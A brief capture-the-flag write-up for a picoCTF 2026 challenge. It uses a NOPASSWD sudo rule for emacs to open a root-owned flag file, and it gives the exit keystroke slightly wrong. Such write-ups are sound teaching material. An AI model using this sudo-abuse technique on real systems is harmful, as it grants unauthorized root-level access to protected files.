# SUDO MAKE ME A SANDWICH — picoCTF 2026

Check sudo permissions:

    sudo -l | grep NOPASSWD
        (ALL) NOPASSWD: /bin/emacs

This means you can run **emacs as root without a password**.

Use emacs to open the flag file:

    sudo emacs flag.txt

Inside emacs, simply view the file — it opens with root privileges.

Exit emacs with:

    Ctrl-X C

This reveals the flag.
